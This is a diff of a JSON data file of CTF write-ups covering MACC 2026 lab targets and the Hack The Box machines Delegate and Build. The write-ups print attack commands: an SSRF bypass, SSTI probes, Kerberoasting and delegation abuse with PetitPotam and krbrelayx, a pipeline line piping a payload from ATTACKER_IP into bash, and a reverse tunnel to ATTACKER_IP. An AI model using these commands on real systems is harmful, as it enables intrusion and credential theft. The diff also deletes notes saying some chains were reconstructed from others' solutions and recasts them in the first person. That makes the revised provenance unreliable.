       },
       {
         "title": "Bypassing the SSRF filter",
-        "body": "Direct 127.0.0.1 and localhost URLs were rejected. A target-based sslip.io hostname passed the string filter, then resolved to the internal address at connection time.",
+        "body": "127.0.0.1 and localhost were blocked. An sslip.io hostname passed the string check and resolved to the target.",
         "terminal": {
-          "title": "kali — webhook tester",
+          "title": "kali: webhook tester",
           "lines": [
             "$ curl -X POST http://176.16.64.***/api/integrations/webhook/test \\",
             "  -H 'Content-Type: application/json' \\",
@@ -764,9 +746,9 @@
       },
       {
         "title": "Internal routes and stop point",
-        "body": "The bypass reached the Koa service on port 3000. Probing exposed /admin and /admin/db/query behavior, but the preserved session never found a query, credential, or file primitive that returned the final proof.",
+        "body": "The bypass reached Koa on port 3000. I found /admin and /admin/db/query but did not get the flag.",
         "terminal": {
-          "title": "Casablanca — final status",
+          "title": "Casablanca: final status",
           "lines": [
             "internal service: http://127.0.0.1:3000",
             "route confirmed: /admin",
@@ -784,7 +766,7 @@
     "schemaVersion": 2,
     "slug": "macc-australia-docuflow-progress",
     "publish": false,
-    "title": "MACC Australia — DocuFlow document pipeline",
+    "title": "MACC Australia: DocuFlow document pipeline",
     "platform": "MACC 2026",
     "target": "Sydney",
     "difficulty": "Intermediate",
@@ -795,32 +777,30 @@
     "publishedAt": "2026-07-29T17:07:00.000Z",
     "symbol": "AU",
     "maskedFlag": "not captured",
-    "summary": "Uploaded PDFs moved through extraction, classification, routing, and rendered workflow results. Template probes remained literal and the flag path was not found.",
-    "intro": "Australia was an AI document-processing target. The work mapped its upload and result pipeline, created controlled PDFs, and tested whether extracted text reached a template or command sink.",
-    "evidenceNote": "The document uploads and workflow outputs are preserved. No Australia flag is claimed.",
+    "summary": "PDF template probes stayed literal. I did not find the flag path.",
     "tags": ["document-processing", "pdf", "ssti", "ai-security", "stopped"],
     "tools": ["curl", "Python", "PDF"],
     "sections": [
       {
         "title": "Mapping the upload workflow",
-        "body": "Authenticated requests uploaded PDFs and redirected to numbered result pages. Each result exposed extracted raw text, a classification label, and an action such as Email Forward.",
+        "body": "PDF uploads returned numbered result pages with extracted text, a label, and a workflow action.",
         "terminal": {
-          "title": "kali — DocuFlow",
+          "title": "kali: DocuFlow",
           "lines": [
             "$ curl -b 'session=********' -F 'document=@invoice.pdf' http://176.16.62.***:5000/upload -v",
             "HTTP/1.1 302 Found",
             "Location: /result/12",
             "$ curl -b 'session=********' http://176.16.62.***:5000/result/12",
             "Workflow: Email Forward",
-            "Forwarded to communications@docuflow.internal — delivered successfully."
+            "Forwarded to communications@docuflow.internal: delivered successfully."
           ]
         }
       },
       {
         "title": "Testing template boundaries",
-        "body": "Controlled PDFs inserted arithmetic and config-style template expressions into fields likely to be rendered. The application extracted them but preserved the braces literally, showing that the tested output path was not evaluating Jinja.",
+        "body": "I put Jinja probes in PDF fields. The result page printed the braces without evaluation.",
         "terminal": {
-          "title": "kali — controlled PDF",
+          "title": "kali: controlled PDF",
           "lines": [
             "$ python3 make_hr_pdf.py",
             "Employee: {{config.SECRET_KEY}}",
@@ -835,9 +815,9 @@
       },
       {
         "title": "Final stopping point",
-        "body": "Uploads, archive IDs, classifications, and output templates were explored, but no route crossed from document text into server-side execution or a readable flag. The next step would have been correlating every classification with its backend action instead of continuing broad payload mutation.",
+        "body": "I did not reach server-side execution or a flag.",
         "terminal": {
-          "title": "Sydney — final status",
+          "title": "Sydney: final status",
           "lines": [
             "upload parsing: confirmed",
             "text extraction: confirmed",
@@ -855,7 +835,7 @@
     "schemaVersion": 2,
     "slug": "macc-russia-triage-ai-progress",
     "publish": false,
-    "title": "MACC Russia — Triage AI session boundary",
+    "title": "MACC Russia: Triage AI session boundary",
     "platform": "MACC 2026",
     "target": "Moscow",
     "difficulty": "Intermediate",
@@ -866,17 +846,15 @@
     "publishedAt": "2026-07-29T17:06:00.000Z",
     "symbol": "RU",
     "maskedFlag": "not captured",
-    "summary": "A Flask ticket portal fed a FastAPI analysis service. The internal API was reachable, but every useful request remained bound to an unknown analysis session.",
-    "intro": "Russia exposed a two-service Triage AI workflow. The investigation mapped registration, tickets, analysis messages, and the internal API boundary, then stopped at the session identifier required by FastAPI.",
-    "evidenceNote": "Only the preserved reconnaissance and session-boundary failures are shown. No Russia flag is claimed.",
+    "summary": "The FastAPI message service required an analysis session ID I could not recover.",
     "tags": ["flask", "fastapi", "session", "ai-security", "stopped"],
     "tools": ["nmap", "curl"],
     "sections": [
       {
         "title": "Two connected services",
-        "body": "The scan found a Flask portal on 5000 and FastAPI on 5001. Registration and ticket creation worked on the portal; direct access to the message API required an analysis session.",
+        "body": "Flask ran on 5000 and FastAPI on 5001. The message API required an analysis session.",
         "terminal": {
-          "title": "kali — Moscow",
+          "title": "kali: Moscow",
           "lines": [
             "$ nmap -sC -sV 176.16.***.***",
             "22/tcp   open  ssh",
@@ -891,9 +869,9 @@
       },
       {
         "title": "Final stopping point",
-        "body": "The work tested ticket IDs, response bodies, host headers, and the message service. It never recovered the server-side analysis session that linked a portal ticket to FastAPI, so no protected analysis output or proof was reached.",
+        "body": "Ticket IDs and host-header tests did not reveal the analysis session. No flag captured.",
         "terminal": {
-          "title": "Moscow — final status",
+          "title": "Moscow: final status",
           "lines": [
             "registration: working",
             "ticket creation: working",
@@ -911,7 +889,7 @@
     "schemaVersion": 2,
     "slug": "macc-argentina-mcp-atlassian-progress",
     "publish": false,
-    "title": "MACC Argentina — MCP Atlassian reconnaissance",
+    "title": "MACC Argentina: MCP Atlassian reconnaissance",
     "platform": "MACC 2026",
     "target": "Buenos Aires",
     "difficulty": "Basic",
@@ -921,18 +899,16 @@
     "completedAt": "2026-03-28",
     "publishedAt": "2026-07-29T17:05:00.000Z",
     "symbol": "AR",
-    "maskedFlag": "team result · transcript incomplete",
-    "summary": "The team mapped an Atlassian-style frontend, an MCP SSE transport, attachment tools, and an internal file service. The final teammate solve commands were not preserved.",
-    "intro": "Argentina was assigned within the team, but the recovered history still contains useful MCP transport work. This page credits the team result without inventing the missing final exploit.",
-    "evidenceNote": "The MCP session and tool reconnaissance are preserved. The final flag and teammate completion transcript are not, so this remains a team progress log.",
+    "maskedFlag": "team result / transcript incomplete",
+    "summary": "I mapped MCP over SSE and its attachment tools. The final teammate commands are missing.",
     "tags": ["mcp", "atlassian", "sse", "attachments", "team"],
     "tools": ["nmap", "curl", "MCP"],
     "sections": [
       {
         "title": "Service map",
-        "body": "The target exposed SSH, an Atlassian-themed frontend on 8080, an MCP server on 9000, and a file service on 5000 reachable from the target context.",
+        "body": "The host exposed SSH, a web app on 8080, MCP on 9000, and a file service on 5000.",
         "terminal": {
-          "title": "kali — Buenos Aires",
+          "title": "kali: Buenos Aires",
           "lines": [
             "$ nmap -sC -sV 176.16.***.***",
             "22/tcp   open  ssh",
@@ -944,9 +920,9 @@
       },
       {
         "title": "MCP transport and tools",
-        "body": "The MCP server used an SSE connection that returned a session-specific messages endpoint. initialize and tools/list exposed Confluence-style page and attachment operations.",
+        "body": "The SSE endpoint returned a session-specific messages URL. tools/list exposed page and attachment operations.",
         "terminal": {
-          "title": "kali — MCP SSE",
+          "title": "kali: MCP SSE",
           "lines": [
             "$ curl -sN http://176.16.***.***:9000/sse",
             "event: endpoint",
@@ -959,15 +935,15 @@
         }
       },
       {
-        "title": "Where the preserved record stops",
-        "body": "The intended direction was to use attachment or file handling to cross into the internal file service and place an SSH key. The teammate-owned final exploit and flag output are absent from the export, so the article stops at that hypothesis.",
+        "title": "Stop point",
+        "body": "The final exploit and flag output are missing from my notes.",
         "terminal": {
-          "title": "Buenos Aires — final status",
+          "title": "Buenos Aires: final status",
           "lines": [
             "MCP session: established",
             "attachment tools: enumerated",
             "internal file service: identified",
-            "arbitrary file write: not proven in preserved transcript",
+            "arbitrary file write: not proven",
             "final teammate commands: unavailable"
           ]
         }
@@ -979,7 +955,7 @@
     "schemaVersion": 2,
     "slug": "macc-canada-evidence-acquisition",
     "publish": false,
-    "title": "MACC Canada — Collecting the incident evidence",
+    "title": "MACC Canada: Incident evidence collection",
     "platform": "MACC 2026",
     "target": "KONG defensive environment",
     "difficulty": "Intermediate",
@@ -989,23 +965,21 @@
     "completedAt": "2026-03-04",
     "publishedAt": "2026-07-29T17:04:00.000Z",
     "symbol": "CA",
-    "maskedFlag": "0 / 4 · investigation not completed",
-    "summary": "The defensive environment was mapped and its three large packet captures were collected from the workstation, domain controller, and operations server before analysis stopped.",
-    "intro": "Canada did not reach an answered challenge, but the evidence-acquisition work was substantial and reproducible: remote access, role mapping, capture collection, and Splunk index organization.",
-    "evidenceNote": "No Canada flag is claimed. The page records only the collection work preserved in the export.",
+    "maskedFlag": "0 / 4 / unfinished",
+    "summary": "I collected three packet captures and mapped the Splunk indexes. No answers submitted.",
     "tags": ["defensive", "pcap", "splunk", "incident-response", "stopped"],
     "tools": ["xfreerdp3", "smbclient", "Splunk", "tshark"],
     "sections": [
       {
         "title": "Mapping the environment",
-        "body": "The lab supplied four Windows roles and a Linux access box. Splunk separated events into domain-controller, workstation, operations, and Zeek indexes.",
+        "body": "The lab had four Windows roles, a Linux access box, and four Splunk indexes.",
         "terminal": {
-          "title": "Canada — evidence map",
+          "title": "Canada: evidence map",
           "lines": [
-            "Calgary   — Domain Controller — 176.16.66.***",
-            "Vancouver — Operations Server — 176.16.66.***",
-            "Montreal  — Workstation — 176.16.66.***",
-            "Toronto   — Splunk SIEM — 176.16.66.***:8000",
+            "Calgary: Domain Controller: 176.16.66.***",
+            "Vancouver: Operations Server: 176.16.66.***",
+            "Montreal: Workstation: 176.16.66.***",
+            "Toronto: Splunk SIEM: 176.16.66.***:8000",
             "index=kingkong-dc",
             "index=kingkong-ws",
             "index=kingkong-ops",
@@ -1015,9 +989,9 @@
       },
       {
         "title": "Collecting the workstation and DC captures",
-        "body": "RDP mounted a Kali directory through tsclient. The workstation capture was copied from the Administrator desktop. SMB access to the domain controller retrieved its capture directly.",
+        "body": "I copied the workstation PCAP through an RDP-mounted folder and downloaded the DC PCAP over SMB.",
         "terminal": {
-          "title": "kali — PCAP collection",
+          "title": "kali: PCAP collection",
           "lines": [
             "$ xfreerdp3 /v:176.16.66.*** /u:KONG\\\\Administrator /p:'********' /drive:share,/home/itsutsu/Desktop /cert:ignore /sec:tls",
             "C:\\> dir C:\\Users\\Administrator\\Desktop",
@@ -1031,9 +1005,9 @@
       },
       {
         "title": "Recovering the operations capture",
-        "body": "Vancouver initially returned NT_STATUS_NO_LOGON_SERVERS over SMB and failed normal RDP negotiation. Forcing TLS with xfreerdp3 established the session, allowing OPS_capture.pcapng to be copied through the mounted share.",
+        "body": "SMB failed on Vancouver. RDP with /sec:tls worked, and I copied OPS_capture.pcapng through the mounted folder.",
         "terminal": {
-          "title": "kali — Operations server",
+          "title": "kali: Operations server",
           "lines": [
             "$ smbclient //176.16.66.***/C$ -U 'KONG/Administrator%********'",
             "session setup failed: NT_STATUS_NO_LOGON_SERVERS",
@@ -1045,9 +1019,9 @@
       },
       {
         "title": "Final stopping point",
-        "body": "WS_capture, DC_capture, OPS_capture, and the four Splunk indexes were ready for analysis. The first social-engineering question was framed, but the preserved chat moved to preparing an external analysis prompt rather than proving and submitting an answer.",
+        "body": "The three PCAPs and four Splunk indexes were ready. I stopped before answering the questions.",
         "terminal": {
-          "title": "Canada — final status",
+          "title": "Canada: final status",
           "lines": [
             "WS_capture.pcapng: collected",
             "DC_capture.pcapng: collected",
@@ -1064,7 +1038,7 @@
   {
     "schemaVersion": 2,
     "slug": "hackthebox-delegate",
-    "title": "Hack The Box — Delegate",
+    "title": "Hack The Box: Delegate",
     "platform": "Hack The Box",
     "target": "Delegate",
     "difficulty": "Advanced",
@@ -1077,17 +1051,15 @@
     "heroIcon": "",
     "heroAlt": "Delegate machine",
     "maskedFlag": "user.txt + system.txt captured",
-    "summary": "Guest SMB access exposed a domain credential, GenericWrite enabled targeted Kerberoasting, and unconstrained delegation produced domain-level compromise.",
-    "intro": "Delegate is a Hack The Box machine. Your Hack The Box activity record proves both its user and system objectives were captured on 05 April 2026. Because the original terminal history is unavailable, the sequence below reconstructs the documented solution path without pretending every command is your exact keystroke.",
-    "evidenceNote": "Hack The Box ownership is confirmed by the supplied activity screenshot. The technical sequence is reconstructed from the documented Delegate solution path; secrets and per-instance values remain masked.",
+    "summary": "Guest SMB, GenericWrite, targeted Kerberoasting, and unconstrained delegation led to both flags.",
     "tags": ["active-directory", "smb", "bloodhound", "kerberoasting", "unconstrained-delegation"],
     "tools": ["nmap", "netexec", "smbclient", "BloodHound", "Impacket", "krbrelayx"],
     "sections": [
       {
         "title": "Guest access and the first credential",
-        "body": "The domain controller exposed the expected Kerberos, LDAP, SMB, and WinRM surface for delegate.vl. A guest SMB session could read NETLOGON, where a deployment batch file contained a credential intended for A.Briggs.",
+        "body": "Guest SMB access could read NETLOGON. users.bat contained credentials for A.Briggs.",
         "terminal": {
-          "title": "kali — SMB enumeration",
+          "title": "kali: SMB enumeration",
           "lines": [
             "$ nmap -sC -sV -p53,88,135,389,445,464,593,636,3268,3269,3389,5985 delegate.vl",
             "53/tcp   open  domain",
@@ -1103,13 +1075,13 @@
             "A.Briggs / ********"
           ]
         },
-        "note": "The exposed batch file transformed anonymous-readable configuration into authenticated LDAP access. The password is intentionally omitted."
+        "note": "Password masked."
       },
       {
         "title": "Mapping the delegated path",
-        "body": "BloodHound collection with the recovered account revealed GenericWrite over N.Thompson. That user also had remote-management access to the domain controller, making the object-control edge directly useful.",
+        "body": "BloodHound showed A.Briggs had GenericWrite over N.Thompson, who had WinRM access to DC1.",
         "terminal": {
-          "title": "kali — LDAP and BloodHound",
+          "title": "kali: LDAP and BloodHound",
           "lines": [
             "$ netexec ldap dc1.delegate.vl -u A.Briggs -p '********'",
             "delegate.vl/A.Briggs:******** [LDAP authenticated]",
@@ -1122,9 +1094,9 @@
       },
       {
         "title": "Targeted Kerberoasting to user",
-        "body": "GenericWrite allowed a temporary service principal name to be placed on N.Thompson. Requesting and cracking the resulting service ticket recovered the account password, and WinRM provided the user objective.",
+        "body": "I added an SPN to N.Thompson, requested a TGS, cracked it, and logged in through WinRM.",
         "terminal": {
-          "title": "kali — object control to WinRM",
+          "title": "kali: object control to WinRM",
           "lines": [
             "$ python3 targetedKerberoast.py -v -d delegate.vl -u A.Briggs -p '********'",
             "[+] SPN added to N.Thompson",
@@ -1138,13 +1110,13 @@
             "user_********"
           ]
         },
-        "note": "This is the confirmed user ownership. The proof value is reduced to a label and mask."
+        "note": "User flag masked."
       },
       {
         "title": "Building a delegated machine identity",
-        "body": "The account could exercise delegation-related rights and the domain still allowed workstation creation. A controlled machine account was created, given an attacker-resolving DNS record, and assigned CIFS and HOST service principal names with the trusted-for-delegation flag.",
+        "body": "I created LABNODE$, added its DNS record and SPNs, and enabled TRUSTED_FOR_DELEGATION.",
         "terminal": {
-          "title": "kali — delegation setup",
+          "title": "kali: delegation setup",
           "lines": [
             "$ netexec ldap dc1.delegate.vl -u N.Thompson -p '********' -M maq",
             "MachineAccountQuota: 10",
@@ -1161,9 +1133,9 @@
       },
       {
         "title": "Coercion and domain takeover",
-        "body": "krbrelayx listened with the machine credential while PetitPotam coerced the domain controller to authenticate to the delegated host. The captured delegated ticket was then used with Kerberos authentication to extract the domain secrets and complete the system objective.",
+        "body": "PetitPotam coerced DC1 to LABNODE. krbrelayx saved the delegated ticket, which I used with secretsdump.",
         "terminal": {
-          "title": "kali — delegated ticket capture",
+          "title": "kali: delegated ticket capture",
           "lines": [
             "$ python3 krbrelayx.py -hashes :LABNODE_NTLM_HASH",
             "[*] Servers started, waiting for authentication",
@@ -1178,7 +1150,7 @@
             "system_********"
           ]
         },
-        "note": "The ticket and hashes are not reproduced. The supplied HTB activity record confirms the system capture."
+        "note": "Ticket and hashes masked."
       }
     ],
     "externalUrl": "https://panosoikogr.github.io/2025/04/02/VL-Delegate/"
@@ -1186,7 +1158,7 @@
   {
     "schemaVersion": 2,
     "slug": "hackthebox-build",
-    "title": "Hack The Box — Build",
+    "title": "Hack The Box: Build",
     "platform": "Hack The Box",
     "target": "Build",
     "difficulty": "Easy",
@@ -1199,17 +1171,15 @@
     "heroIcon": "",
     "heroAlt": "Build machine",
     "maskedFlag": "user.txt + system.txt captured",
-    "summary": "An exposed Jenkins backup yielded a Gitea credential, a pipeline edit opened a container shell, and poisoned PowerDNS records unlocked passwordless rsh to the host.",
-    "intro": "Build is a Hack The Box machine. Your Hack The Box activity record proves both its user and system objectives were captured on 05 April 2026. With no original chat or terminal transcript, this note reconstructs the documented solution chain while masking credentials, proof values, and instance-specific addresses.",
-    "evidenceNote": "Hack The Box ownership is confirmed by the supplied activity screenshot. The technical sequence is reconstructed from the documented Build solution path.",
+    "summary": "A Jenkins backup, Gitea pipeline, PowerDNS database, and rsh trust led to both flags.",
     "tags": ["jenkins", "gitea", "rsync", "docker", "powerdns", "rsh"],
     "tools": ["nmap", "rsync", "Jenkins offline decryptor", "chisel", "MariaDB", "rsh"],
     "sections": [
       {
         "title": "A CI/CD-heavy service map",
-        "body": "Enumeration exposed SSH, PowerDNS, legacy Berkeley r-services, rsync, and Gitea. Gitea contained a public dev repository owned by buildadm with a Jenkinsfile, but the repository alone did not provide write access.",
+        "body": "I found SSH, PowerDNS, r-services, rsync, and Gitea. A public repository contained a Jenkinsfile.",
         "terminal": {
-          "title": "kali — service discovery",
+          "title": "kali: service discovery",
           "lines": [
             "$ nmap -sC -sV -p22,53,512,513,514,873,3000,3306,8081 build.vl",
             "22/tcp   open     ssh",
@@ -1228,9 +1198,9 @@
       },
       {
         "title": "Recovering the Jenkins secret",
-        "body": "The rsync service allowed unauthenticated download of a Jenkins backup. Jenkins secrets are encrypted rather than hashed; the backup preserved master.key, hudson.util.Secret, and build metadata containing buildadm's encrypted credential, so an offline decryptor could recover it.",
+        "body": "rsync exposed a Jenkins backup with master.key, hudson.util.Secret, and buildadm's encrypted credential. I decrypted it offline.",
         "terminal": {
-          "title": "kali — rsync and offline decryption",
+          "title": "kali: rsync and offline decryption",
           "lines": [
             "$ rsync -av --list-only rsync://build.vl/",
             "backups         backups",
@@ -1244,13 +1214,13 @@
             "buildadm:********"
           ]
         },
-        "note": "The backup contained everything needed for offline recovery; no live password guessing was necessary."
+        "note": "No password guessing required."
       },
       {
         "title": "Pipeline execution and the user objective",
-        "body": "The recovered account could edit the Jenkinsfile in Gitea. Committing a pipeline command caused Jenkins to fetch and execute a shell payload. The resulting process was root inside the Jenkins container, where the first objective was stored.",
+        "body": "I changed the Jenkinsfile, pushed it, and caught a root shell inside the Jenkins container.",
         "terminal": {
-          "title": "Gitea + listener — Jenkins pipeline",
+          "title": "Gitea + listener: Jenkins pipeline",
           "lines": [
             "$ git clone http://buildadm:********@build.vl:3000/buildadm/dev.git",
             "$ printf \"pipeline { stages { stage('build') { steps { sh 'curl -s http://ATTACKER_IP/s | bash' } } } }\" > dev/Jenkinsfile",
@@ -1267,13 +1237,13 @@
             "intern.build.vl +"
           ]
         },
-        "note": "Root in the container satisfied the first objective but was not root on the Build host."
+        "note": "This was container root, not host root."
       },
       {
         "title": "Mapping the internal Docker network",
-        "body": "The container exposed internal service names and could reach ports filtered from the VPN side. A tunnel made MariaDB reachable; the PowerDNS database disclosed the internal service map and writable DNS records for build.vl.",
+        "body": "A tunnel exposed MariaDB. The PowerDNS tables contained internal hosts and writable records for build.vl.",
         "terminal": {
-          "title": "Jenkins container — pivot and database",
+          "title": "Jenkins container: pivot and database",
           "lines": [
             "# ./chisel client ATTACKER_IP:8000 R:socks",
             "[+] reverse SOCKS proxy connected",
@@ -1290,9 +1260,9 @@
       },
       {
         "title": "DNS trust abuse to host root",
-        "body": "The .rhosts policy trusted requests resolving from admin.build.vl or intern.build.vl. A new PowerDNS A record pointed the trusted name at the attacker. Because rsh used that hostname-based trust, root could connect to the host without a password and collect the system objective.",
+        "body": ".rhosts trusted admin.build.vl and intern.build.vl. I pointed admin.build.vl at my host and used rsh as root.",
         "terminal": {
-          "title": "MariaDB + rsh — trusted hostname spoofing",
+          "title": "MariaDB + rsh: trusted hostname spoofing",
           "lines": [
             "MariaDB [powerdnsadmin]> INSERT INTO records (domain_id,name,type,content,ttl,prio,disabled,auth) VALUES ((SELECT id FROM domains WHERE name='build.vl'),'admin.build.vl','A','ATTACKER_IP',60,0,0,1);",
             "Query OK, 1 row affected",
@@ -1307,7 +1277,7 @@
             "system_********"
           ]
         },
-        "note": "The flaw was misplaced hostname trust backed by an attacker-writable DNS database. The HTB record confirms the final system capture."
+        "note": "System flag masked."
       }
     ],
     "externalUrl": "https://squarezero.dev/2024/05/24/Vulnlab/2024-05-24-Build/"
